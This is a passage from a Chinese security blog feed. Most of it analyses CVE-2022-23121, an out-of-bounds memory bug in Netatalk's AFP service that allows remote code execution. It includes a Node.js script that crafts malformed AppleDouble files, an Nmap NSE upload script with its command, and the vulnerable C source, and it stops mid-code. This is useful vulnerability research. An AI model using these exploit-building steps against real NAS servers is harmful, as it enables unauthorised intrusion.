href="https://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions" target="_blank">https://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/" target="_blank">https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/</a></p></blockquote><p><strong>Created at 2023-11-24T15:49:32+08:00</strong></p></description></item><item><title>CVE-2022-23121 AFP RCE 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</link><pubDate>Thu, 23 Nov 2023 10:46:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2022-23121-afp-rce/</guid><description><h3 id="netatalk介绍">Netatalk介绍</h3><p><a href="http://netatalk.sourceforge.net/" target="_blank">Netatalk</a> 是一个<code>Apple Filing Protocol (AFP)</code> 的开源实现。它为 Unix 风格系统提供了与 Macintosh 文件共享的功能。多款NAS产品均有集成该功能。</p><h3 id="漏洞简介">漏洞简介</h3><p>Netatalk在处理<code>FPOpenFork</code>命令的时候，由于未检查AppleDouble文件头中的偏移是否超出范围，导致攻击者可以通过控制AppleDouble文件的某些偏移，在内存中进行越界读写，通过该漏洞攻击者可以以启动Netatalk的用户权限执行任意命令</p><h3 id="appledouble文件">Appledouble文件</h3><p>Appledouble文件格式文档可在下面链接下载，AppleDouble文件是mac上一种存储数据的格式，AppleDouble文件可分为文件头和数据部分，文件头格式如下，对于每个Entry来说，数据在文件内的范围可表示为：<code>[offset:offset+length]</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Field Length</span></span><span style="display:flex;"><span>Magic number 4 bytes</span></span><span style="display:flex;"><span>Version number 4 bytes</span></span><span style="display:flex;"><span>Filler 16 bytes</span></span><span style="display:flex;"><span>Number of entries 2 bytes</span></span><span style="display:flex;"><span>Entry descriptor for each entry:</span></span><span style="display:flex;"><span> Entry ID 4 bytes</span></span><span style="display:flex;"><span> Offset 4 bytes</span></span><span style="display:flex;"><span> Length 4 bytes</span></span></code></pre></div><p>以下是一个有效的Appledouble文件，包含两个entry</p><p>entry 1</p><ul><li>entry ID：0x09</li><li>offset：0x32</li><li>length：0x71</li></ul><p>entry 2</p><ul><li>entry ID：0x02</li><li>offset：0xA3</li><li>length：0x46</li></ul><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/1.png"/></p><blockquote><p><a href="https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf" target="_blank">https://web.archive.org/web/20180311140826if_/http://kaiser-edv.de/documents/AppleSingle_AppleDouble.pdf</a></p></blockquote><h3 id="如何生成有效的appledouble文件触发漏洞">如何生成有效的<strong>AppleDouble文件触发漏洞</strong></h3><p>在<a href="https://nosec.org/home/detail/4997.html" target="_blank">https://nosec.org/home/detail/4997.html</a> 中keeee师傅分享了如何通过xattr库生成appledouble文件，这里为了方便生成所需文件对keeee师傅的方法进行魔改。</p><p>首先安装 xattr-file和minimist库：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>npm install xattr-file</span></span><span style="display:flex;"><span>npm install minimist</span></span></code></pre></div><p>在node_modules目录内找到xattr-file.js文件，修改creat方法，为其添加接受各种偏移的接口，大致如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">function</span><span style="color:#a6e22e">create</span>(<span style="color:#a6e22e">attrs</span>,<span style="color:#a6e22e">resoLength</span>,<span style="color:#a6e22e">findoff</span>,<span style="color:#a6e22e">findlen</span>,<span style="color:#a6e22e">forkoff</span>,<span style="color:#a6e22e">forklen</span>) {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">finderInfoOffset</span><span style="color:#f92672">=</span><span style="color:#a6e22e">findoff</span><span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span><span style="color:#a6e22e">applLength</span><span style="color:#f92672">:</span><span style="color:#a6e22e">findoff</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">finderInfoLength</span><span style="color:#f92672">=</span><span style="color:#a6e22e">findlen</span><span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span> (<span style="color:#a6e22e">attrLength</span><span style="color:#f92672">+</span><span style="color:#a6e22e">keysLength</span><span style="color:#f92672">+</span><span style="color:#a6e22e">dataLength</span>)<span style="color:#f92672">:</span><span style="color:#a6e22e">findlen</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">resourceForkOffset</span><span style="color:#f92672">=</span><span style="color:#a6e22e">forkoff</span><span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span><span style="color:#a6e22e">fileLength</span><span style="color:#f92672">:</span><span style="color:#a6e22e">forkoff</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">resourceForkLength</span><span style="color:#f92672">=</span><span style="color:#a6e22e">forklen</span><span style="color:#f92672">==</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">?</span><span style="color:#a6e22e">resoLength</span><span style="color:#f92672">:</span><span style="color:#a6e22e">forklen</span></span></span></code></pre></div><p>生成xattr文件的nodejs脚本：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">xattr</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">"xattr-file"</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">args</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">'minimist'</span>)(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">argv</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">2</span>))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#a6e22e">fs</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">'fs'</span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">fp</span><span style="color:#f92672">=</span><span style="color:#e6db74">'./'</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">origname</span><span style="color:#f92672">=</span><span style="color:#e6db74">'read'</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// resource fork data 部分：</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">buffer2</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">"a"</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">0x12</span>))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">buffer3</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#e6db74">"a"</span>.<span style="color:#a6e22e">repeat</span>(<span style="color:#ae81ff">0x34</span>))</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">buffer2</span>,<span style="color:#a6e22e">buffer3</span>]).<span style="color:#a6e22e">length</span>)<span style="color:#75715e">// 打印的 resource fork data 长度。</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">resoLength</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">buffer2</span>,<span style="color:#a6e22e">buffer3</span>]).<span style="color:#a6e22e">length</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">findoff</span><span style="color:#f92672">=</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'findoff'</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> parseInt(<span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'findoff'</span>])</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">findlen</span><span style="color:#f92672">=</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'findlen'</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> parseInt(<span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'findlen'</span>])</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">forklen</span><span style="color:#f92672">=</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'forklen'</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> parseInt(<span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'forklen'</span>])</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">forkoff</span><span style="color:#f92672">=</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'forkoff'</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> parseInt(<span style="color:#a6e22e">args</span>[<span style="color:#e6db74">'forkoff'</span>])</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果name为空则为read</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">var</span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">"name"</span>]<span style="color:#f92672">==</span><span style="color:#66d9ef">undefined</span><span style="color:#f92672">?</span><span style="color:#a6e22e">origname</span><span style="color:#f92672">:</span><span style="color:#a6e22e">args</span>[<span style="color:#e6db74">"name"</span>]</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">'findoff:'</span><span style="color:#f92672">+</span><span style="color:#a6e22e">findoff</span><span style="color:#f92672">+</span><span style="color:#e6db74">" findlen:"</span><span style="color:#f92672">+</span><span style="color:#a6e22e">findlen</span><span style="color:#f92672">+</span><span style="color:#e6db74">" forkoff:"</span><span style="color:#f92672">+</span><span style="color:#a6e22e">forkoff</span><span style="color:#f92672">+</span><span style="color:#e6db74">" forklen:"</span><span style="color:#f92672">+</span><span style="color:#a6e22e">forklen</span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">buffer</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xattr</span>.<span style="color:#a6e22e">create</span>({</span></span><span style="display:flex;"><span><span style="color:#e6db74">"com.example.Attribute"</span><span style="color:#f92672">:</span><span style="color:#e6db74">"my data"</span></span></span><span style="display:flex;"><span>},<span style="color:#a6e22e">resoLength</span>,<span style="color:#a6e22e">findoff</span>,<span style="color:#a6e22e">findlen</span>,<span style="color:#a6e22e">forkoff</span>,<span style="color:#a6e22e">forklen</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span><span style="color:#a6e22e">buffer4</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">buffer</span>,<span style="color:#a6e22e">buffer2</span>,<span style="color:#a6e22e">buffer3</span>])</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFile</span>(<span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#e6db74">'._'</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>,<span style="color:#a6e22e">buffer4</span>, {<span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0o777</span> },<span style="color:#a6e22e">err</span> => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span></span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">"success write file, file path: "</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#e6db74">'._'</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>)</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">//文件写入成功。</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>}</span></span><span style="display:flex;"><span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFile</span>(<span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>,<span style="color:#e6db74">"hello world"</span>, {<span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0o777</span> },<span style="color:#a6e22e">err</span> => {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">err</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">err</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span></span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">"success write file, file path: "</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>)</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">//文件写入成功。</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>}</span></span><span style="display:flex;"><span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">chmod</span>(<span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>,<span style="color:#ae81ff">0o777</span>, () => {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">"change "</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span><span style="color:#f92672">+</span><span style="color:#e6db74">" mode"</span>)</span></span><span style="display:flex;"><span>})</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">chmod</span>(<span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#e6db74">'._'</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span>,<span style="color:#ae81ff">0o777</span>, () => {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">"change "</span><span style="color:#f92672">+</span><span style="color:#a6e22e">fp</span><span style="color:#f92672">+</span><span style="color:#e6db74">'._'</span><span style="color:#f92672">+</span><span style="color:#a6e22e">name</span><span style="color:#f92672">+</span><span style="color:#e6db74">" mode"</span>)</span></span><span style="display:flex;"><span>})</span></span></code></pre></div><p><strong>如何将文件上传到服务器</strong></p><p>生成文件后，为了更贴合实际漏洞利用场景，即生成有效AppleDouble文件后通过AFP客户端上传到AFP服务器，这里借鉴Nmap自带的afp的lua库，编写我们自己的上传NSE脚本。</p><p>在Nmap中原生包含了afp-ls的NSE脚本，其引用的lua库afp.lua内含有我们通过AFP协议上传文件需要的接口WriteFile，在上传文件的NSE脚本中调用该接口即可</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/2.png"/></p><p>在scripts目录下新建afp-upfile.nse文件，将afp-ls.nse内容粘贴进去，去掉列出文件逻辑的代码，之后编写lua代码，读取文件，将文件内容传给afp.lua内的WriteFile函数即可，最终如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>action<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host, port)</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 这里和afp-ls的逻辑一样</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> msg</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> uploadpath<span style="color:#f92672">=</span> args[<span style="color:#e6db74">"uploadpath"</span>]</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> filepath<span style="color:#f92672">=</span> args[<span style="color:#e6db74">"filepath"</span>]</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> poc<span style="color:#f92672">=</span> io.open(filepath,<span style="color:#e6db74">"r"</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> data<span style="color:#f92672">=</span> poc:read(<span style="color:#e6db74">"*all"</span>)</span></span><span style="display:flex;"><span> poc:close()</span></span><span style="display:flex;"><span> status, msg<span style="color:#f92672">=</span> afpHelper:WriteFile(uploadpath, data)</span></span><span style="display:flex;"><span> status, response<span style="color:#f92672">=</span> afpHelper:Logout()</span></span><span style="display:flex;"><span> status, response<span style="color:#f92672">=</span> afpHelper:CloseSession()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> data</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span></span></span></code></pre></div><p>利用该脚本，可以通过nmap上传文件到afp服务器</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p<span style="color:#ae81ff">548</span> --script<span style="color:#f92672">=</span>afp-upfile --script-args<span style="color:#e6db74">"uploadpath=test/._cmd,filepath=./._cmd"</span> ip</span></span></code></pre></div><h3 id="漏洞成因">漏洞成因</h3><p><code>libatalk/adouble/ad_open.c#parse_entries</code> 函数为Nettatalk解析buf内的数据到自定义的结构体，通过读取buf内对应offset的数据到传入的ad指针指向的<code>adouble</code>结构体的某些成员内，完成对相应值的设置，<strong>其中buf数据来自读取的._filename的文件</strong>。在循环中将buf首地址加上某个offset中的数据通过<code>memcpy</code>函数拷贝到ad指向的adouble结构体变量内，在循环内含有一个if判断，当处于以下情况时，<code>parse_entries</code> 会返回-1并且打印警告日志</p><ol><li><code>eid > ADEID_MAX，ADEID_MAX=20</code></li><li><code>off>sizeof(ad->ad_data)</code></li><li>eid不等于2并且此时的entry的偏移和数据长度相加大于1024</li></ol><p>即通过控制文件内的数据，我们可以控制adouble结构体内的entry的off+len使得entry.off+entry.len+buf超过buf的边界，正常流程中adouble结构体内的entry的off+len+buf不应该越过buf边界。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">parse_entries</span>(<span style="color:#66d9ef">struct</span><span style="color:#a6e22e">adouble</span><span style="color:#f92672">*</span>ad,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">uint16_t</span> nentries)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint32_t</span> eid, len, off;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#75715e">/* now, read in the entry bits */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (; nentries<span style="color:#f92672">></span><span style="color:#ae81ff">0</span>; nentries<span style="color:#f92672">--</span> ) {</span></span><span style="display:flex;"><span> memcpy(<span style="color:#f92672">&amp;</span>eid, buf,<span style="color:#66d9ef">sizeof</span>( eid ));</span></span><span style="display:flex;"><span> eid<span style="color:#f92672">=</span> get_eid(ntohl(eid));</span></span><span style="display:flex;"><span> buf<span style="color:#f92672">+=</span><span style="color:#66d9ef">sizeof</span>( eid );</span></span><span style="display:flex;"><span> memcpy(<span style="color:#f92672">&amp;</span>off, buf,<span style="color:#66d9ef">sizeof</span>( off ));</span></span><span style="display:flex;"><span> off<span style="color:#f92672">=</span> ntohl( off );</span></span><span style="display:flex;"><span> buf<span style="color:#f92672">+=</span><span style="color:#66d9ef">sizeof</span>( off );</span></span><span style="display:flex;"><span> memcpy(<span style="color:#f92672">&amp;</span>len, buf,<span style="color:#66d9ef">sizeof</span>( len ));</span></span><span style="display:flex;"><span> len<span style="color:#f92672">=</span> ntohl( len );</span></span><span style="display:flex;"><span> buf<span style="color:#f92672">+=</span><span style="color:#66d9ef">sizeof</span>( len );</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> ad<span style="color:#f92672">-></span>ad_eid[eid].ade_off<span style="color:#f92672">=</span> off;</span></span><span style="display:flex;"><span> ad<span style="color:#f92672">-></span>ad_eid[eid].ade_len<span style="color:#f92672">=</span> len;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>eid</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> eid<span style="color:#f92672">></span> ADEID_MAX</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> off<span style="color:#f92672">>=</span><span style="color:#66d9ef">sizeof</span>(ad<span style="color:#f92672">-></span>ad_data)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> ((eid<span style="color:#f92672">!=</span> ADEID_RFORK)<span style="color:#f92672">&amp;&amp;</span> (off<span style="color:#f92672">+</span> len<span style="color:#f92672">></span><span style="color:#66d9ef">sizeof</span>(ad<span style="color:#f92672">-></span>ad_data))))<span style="color:#75715e">// ADEID_RFORK</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> {</span></span><span style="display:flex;"><span> ret<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> LOG(log_warning, logtype_ad,<span style="color:#e6db74">"parse_entries: bogus eid: %u, off: %u, len: %u"</span>,</span></span><span style="display:flex;"><span> (uint)eid, (uint)off, (uint)len);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ret;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// adouble 定义</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span><span style="color:#a6e22e">adouble</span> {</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> ad_data[AD_DATASZ_MAX];<span style="color:#75715e">//AD_DATASZ_MAX = 1024</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>};</span></span></code></pre></div><p>在代码里，在以下几处函数中有调用<code>parse_entries</code> 函数</p><ul><li><code>ad_header_read</code></li><li><code>ad_header_read_osx</code></li><li><code>ad_header_read_ea</code></li></ul><p>在三处函数中，只有<code>libatalk/adouble/ad_open.c#ad_header_read_osx</code>函数调用<code>parse_entries</code>函数时，即使<code>parse_entries</code>返回-1，该函数不会<code>return</code>也不会进入异常处理流程，仅仅是通过日志记录，继续执行而不报错。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (parse_entries(<span style="color:#f92672">&amp;</span>adosx, buf, nentries)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>) {</span></span><span style="display:flex;"><span> LOG(log_warning, logtype_ad,<span style="color:#e6db74">"ad_header_read(%s): malformed AppleDouble"</span>,</span></span><span style="display:flex;"><span> path<span style="color:#f92672">?</span> fullpathname(path)<span style="color:#f92672">:</span><span style="color:#e6db74">""</span>);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>之后<code>ad_header_read_osx</code> 会读取adouble结构体内的偏移，判断finderinfo的entry len是否等于32，不等于则进入if内，并调用<code>libatalk/adouble/ad_open.c#ad_convert_osx</code> 函数</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/3.png"/></p><p>在<code>ad_convert_osx</code> 函数中会读取ad指针指向的adouble结构体内的entry结构的off和len偏移并调用<code>memmove</code>函数进行内存复制，此偏移恰好是<code>parse_entries</code> 函数从文件读取并赋值的偏移。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">ad_convert_osx</span>(<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>path,<span style="color:#66d9ef">struct</span><span style="color:#a6e22e">adouble</span><span style="color:#f92672">*</span>ad)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> origlen<span style="color:#f92672">=</span> ad_getentryoff(ad, ADEID_RFORK)<span style="color:#f92672">+</span> ad_getentrylen(ad, ADEID_RFORK);</span></span><span style="display:flex;"><span> map<span style="color:#f92672">=</span> mmap(NULL, origlen, PROT_READ<span style="color:#f92672">|</span> PROT_WRITE, MAP_SHARED, ad_reso_fileno(ad),<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (map<span style="color:#f92672">==</span> MAP_FAILED) {</span></span><span style="display:flex;"><span> LOG(log_error, logtype_ad,<span style="color:#e6db74">"mmap AppleDouble: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, strerror(errno));</span></span><span style="display:flex;"><span> EC_FAIL;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> memmove(map<span style="color:#f92672">+</span> ad_getentryoff(ad, ADEID_FINDERI)<span style="color:#f92672">+</span> ADEDLEN_FINDERI,</span></span><span style="display:flex;"><span> map<span style="color:#f92672">+</span> ad_getentryoff(ad, ADEID_RFORK),</span></span><span style="display:flex;"><span> ad_getentrylen(ad, ADEID_RFORK));</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">void</span>)ad_rebuild_adouble_header_osx(ad, map);</span></span><span style="display:flex;"><span> munmap(map, origlen);</span></span></code></pre></div><h3 id="分析函数调用链"><strong>分析函数调用链</strong></h3><p>通过<a href="https://www.cnblogs.com/realjimmy/p/12892179.html" target="_blank">doxygen+graphviz绘制函数调用链图</a>，从图中可以看出完整的函数调用链为：<code>ad_open→ad_open_rf→ad_open_rf_ea→ad_header_read_osx→parse_entries</code></p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/4.png"/></p><p>而<code>ad_open</code>函数所在的libatalk目录内的代码会被编译为<code>libatalk.so</code>，最终被<code>afpd</code>服务使用，在<code>afpd</code> 代码中，由<code>etc/afpd/fork.c#afp_openfork</code> 调用<code>libatalk/adouble/ad_open.c#ad_open</code>函数。</p><p><img alt="" src="/images/vulnerability/CVE-2022-23121-AFP-RCE.zh-cn.assets/5.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">afp_openfork</span>(AFPObj<span style="color:#f92672">*</span>obj _U_,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>ibuf, size_t ibuflen _U_,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>rbuf, size_t<span 